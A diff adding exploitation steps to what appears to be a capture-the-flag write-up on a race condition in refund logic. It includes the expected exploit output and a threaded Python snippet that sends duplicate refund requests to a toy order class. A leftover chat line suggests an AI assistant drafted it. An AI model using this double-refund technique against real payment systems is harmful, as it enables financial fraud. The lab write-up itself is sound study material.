@@ -1097,7 +1097,55 @@ The flaw lies in the **lack of atomicity and synchronization** in the refund log
 
 ### Exploitation Steps
 
+1. **Run the script
+    Use this command:
+    
+    ```bash
+    python3 exploit.py
+    ```
+    
+2. **Observe the output**  
+    You should see:
+    
+    ```
+    [ORD123] Placed for $100
+    [ORD123] Refunded $100
+    [ORD123] Already refunded
+    Final balance: $200
+    ```
+    
+    Despite the "Already refunded" message, the balance increases by **$200**, proving that **two refunds were issued** for the same order.
+    
+3. **(Optional) Simulate a race condition using threads**  
+    Replace the refund logic with a threaded simulation to mimic concurrent requests:
+    
+    ```python
+    import threading
+    
+    def spam_refund(order):
+        for _ in range(2):
+            order.request_refund()
+    
+    john = User("john")
+    o1 = john.place_order("ORD124", 150)
+    
+    t1 = threading.Thread(target=spam_refund, args=(o1,))
+    t2 = threading.Thread(target=spam_refund, args=(o1,))
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+    
+    print(f"Final balance: ${john.balance}")
+    ```
+    
+4. **Rerun the script**  
+    Observe if the final balance increases beyond the expected single refund, confirming a **race condition exploit** in a multi-threaded or real-world API environment.
+    
 
+---
+
+Let me know if you'd like this compiled into a full Markdown write-up or submitted somewhere!
 
 ### 🚩Flag Captured: `h4kit{order.request_refund()}`
 
